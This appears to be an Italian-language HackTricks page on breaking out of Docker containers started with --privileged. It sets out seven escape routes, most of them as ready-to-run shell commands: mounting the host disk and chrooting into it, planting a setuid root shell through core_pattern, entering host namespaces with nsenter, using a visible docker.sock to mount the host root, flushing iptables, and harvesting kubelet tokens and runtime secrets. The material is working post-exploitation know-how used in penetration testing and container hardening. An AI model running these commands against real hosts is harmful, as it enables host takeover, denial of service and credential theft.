# Evasione dai container `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un container avviato con `--privileged` non è la stessa cosa di un container normale con una o due autorizzazioni in più. In pratica, `--privileged` rimuove o indebolisce diverse protezioni runtime predefinite che normalmente tengono il workload lontano dalle risorse host pericolose. L'effetto esatto dipende comunque dal runtime e dall'host, ma per Docker il risultato tipico è:

- tutte le capabilities sono concesse
- le restrizioni del device cgroup vengono rimosse
- molti filesystem del kernel smettono di essere montati in sola lettura
- i percorsi procfs mascherati di default scompaiono
- il filtraggio seccomp viene disabilitato
- il confinamento AppArmor viene disabilitato
- l'isolamento SELinux viene disabilitato o sostituito con un'etichetta molto più permissiva

La conseguenza importante è che un container privilegiato di solito non necessita di un exploit kernel sofisticato. In molti casi può semplicemente interagire direttamente con dispositivi host, filesystem del kernel esposti all'host o interfacce del runtime e poi pivotare in una shell dell'host.

## Cosa `--privileged` non cambia automaticamente

`--privileged` non si unisce automaticamente ai namespaces PID, network, IPC o UTS dell'host. Un container privilegiato può comunque avere namespaces privati. Questo significa che alcune catene di escape richiedono una condizione aggiuntiva, come ad esempio:

- un bind mount dell'host
- condivisione del PID con l'host
- networking dell'host
- dispositivi host visibili
- interfacce proc/sys scrivibili

Queste condizioni sono spesso facili da soddisfare in casi di malconfigurazione reali, ma sono concettualmente separate dallo stesso `--privileged`.

## Vie di fuga

### 1. Montare il disco host tramite dispositivi esposti

Un container privilegiato di solito vede molti più nodi dispositivo sotto `/dev`. Se il block device dell'host è visibile, la via di fuga più semplice è montarlo e eseguire `chroot` nel filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se la partizione root non è ovvia, prima enumera il layout dei dispositivi a blocchi:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se la via pratica è piantare un helper setuid in un mount dell'host scrivibile piuttosto che in `chroot`, ricorda che non tutti i filesystem rispettano il bit setuid. Un rapido controllo delle capacità lato host è:
```bash
mount | grep -v "nosuid"
```
Questo è utile perché i percorsi scrivibili su filesystem `nosuid` sono molto meno interessanti per i classici workflow "drop a setuid shell and execute it later".

Le protezioni indebolite sfruttate qui sono:

- esposizione completa dei dispositivi
- capabilities ampie, in particolare `CAP_SYS_ADMIN`

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montare o riutilizzare un host bind mount e `chroot`

Se il root filesystem dell'host è già montato all'interno del container, oppure se il container può creare i mount necessari perché è privileged, una shell dell'host spesso è solo a un `chroot` di distanza:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se non esiste alcun host root bind mount ma lo storage dell'host è raggiungibile, creane uno:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Questo percorso sfrutta:

- restrizioni di mount indebolite
- tutte le capabilities
- mancanza di confinamento MAC

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusare di `/proc/sys` o `/sys` scrivibili

Una delle grandi conseguenze di `--privileged` è che le protezioni di procfs e sysfs diventano molto più deboli. Questo può esporre interfacce del kernel rivolte all'host che normalmente sono mascherate o montate in sola lettura.

Un esempio classico è `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Altri percorsi di alto valore includono:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Questa tecnica sfrutta:

- missing masked paths
- missing read-only system paths

Pagine correlate:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usare le capacità complete per escape basato su mount o namespace

Un container privilegiato ottiene le capability che sono normalmente rimosse dai container standard, incluse `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, e molte altre. Questo è spesso sufficiente per trasformare un accesso locale in un host escape non appena esiste un'altra superficie esposta.

Un esempio semplice è montare filesystem aggiuntivi e usare l'ingresso nel namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se anche il PID dell'host è condiviso, il passaggio diventa ancora più breve:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Questo percorso sfrutta:

- il set predefinito di capability privilegiate
- la condivisione opzionale del PID dell'host

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape tramite socket del runtime

Un container privilegiato spesso si ritrova con lo stato runtime dell'host o i socket visibili. Se è raggiungibile un socket Docker, containerd o CRI-O, l'approccio più semplice è spesso usare l'API del runtime per avviare un secondo container con accesso all'host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Per containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Questo percorso sfrutta:

- esposizione del runtime privilegiato
- host bind mounts creati tramite il runtime stesso

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Rimuovere gli effetti collaterali dell'isolamento di rete

`--privileged` di per sé non unisce il network namespace dell'host, ma se il container ha anche `--network=host` o altro accesso alla rete dell'host, l'intero stack di rete diventa modificabile:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Non sempre si traduce in una shell diretta sull'host, ma può causare denial of service, traffic interception o consentire l'accesso a servizi di gestione accessibili solo tramite loopback.

Pagine correlate:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leggere i segreti dell'host e lo stato di runtime

Anche quando una clean shell escape non è immediata, i privileged containers spesso hanno accesso sufficiente per leggere i segreti dell'host, lo stato del kubelet, i runtime metadata e i filesystem dei container vicini:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` è host-mounted o le directory di runtime sono visibili, questo può essere sufficiente per lateral movement o cloud/Kubernetes credential theft anche prima di ottenere una host shell.

Pagine correlate:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Controlli

Lo scopo dei comandi seguenti è confermare quali privileged-container escape families siano immediatamente utilizzabili.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Ciò che è interessante qui:

- un set completo di capability, in particolare `CAP_SYS_ADMIN`
- esposizione di proc/sys scrivibile
- dispositivi host visibili
- assenza di seccomp e confinamento MAC
- socket di runtime o bind mount della root dell'host

Qualsiasi di questi può essere sufficiente per post-exploitation. Diversi insieme solitamente significano che il container è, di fatto, a uno o due comandi dal compromettere l'host.

## Pagine correlate

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
